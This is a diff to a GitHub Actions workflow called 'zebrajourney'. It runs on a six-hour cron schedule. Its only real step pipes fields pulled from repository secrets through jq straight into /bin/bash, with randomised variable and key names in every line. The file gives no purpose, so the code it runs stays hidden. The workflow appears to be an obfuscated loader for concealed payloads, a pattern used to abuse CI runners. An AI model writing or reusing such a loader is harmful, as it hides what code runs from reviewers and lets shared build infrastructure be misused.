@@ -1,30 +1,33 @@
 name: zebrajourney
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
+    - cron: '13 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zebrajourney
         env:
-          to88: ${{ secrets.to88 }}
+          ettio6646: ${{ secrets.ettio6646 }}
         run: |
-          echo $to88 | jq -r .w4215 | /bin/bash
-          echo $fuipm127 | jq -r .dqg53445 | /bin/bash
-          echo $hzvly31585 | jq -r .ys27120 | /bin/bash
-          echo $udg082 | jq -r .m7 | /bin/bash
-          echo $veou748 | jq -r .pbf2 | /bin/bash
-          echo $fc6 | jq -r .gqvpp65307 | /bin/bash
-          echo $oomuy12734 | jq -r .jl58 | /bin/bash
-          echo $n7472 | jq -r .jjfy470 | /bin/bash
-          echo $hp07 | jq -r .izy7307 | /bin/bash
-          echo $hfjt93 | jq -r .r444 | /bin/bash
-          echo $r816 | jq -r .ek386 | /bin/bash
-          echo $kwzc11 | jq -r .zs7046 | /bin/bash
-          echo $kj69 | jq -r .opdg1 | /bin/bash
-          echo $dop19053 | jq -r .be19629 | /bin/bash
-          echo $vbxo722 | jq -r .jqg96 | /bin/bash
+          echo $ettio6646 | jq -r .glqc12 | /bin/bash
+          echo $ze56514 | jq -r .ewdf04 | /bin/bash
+          echo $ch4911 | jq -r .oyqrf0 | /bin/bash
+          echo $odei2 | jq -r .f247 | /bin/bash
+          echo $i496 | jq -r .kao8 | /bin/bash
+          echo $knr6 | jq -r .o588 | /bin/bash
+          echo $ohgym8 | jq -r .e31 | /bin/bash
+          echo $jw19410 | jq -r .ovkoe19 | /bin/bash
+          echo $thk7 | jq -r .kl2 | /bin/bash
+          echo $v4 | jq -r .o016 | /bin/bash
+          echo $ohqvz3682 | jq -r .sl450 | /bin/bash
+          echo $js3042 | jq -r .mwvn6 | /bin/bash
+          echo $ftb10458 | jq -r .nffsg79 | /bin/bash
+          echo $bnls02 | jq -r .xc05 | /bin/bash
+          echo $ut33 | jq -r .pfwsi305 | /bin/bash
 
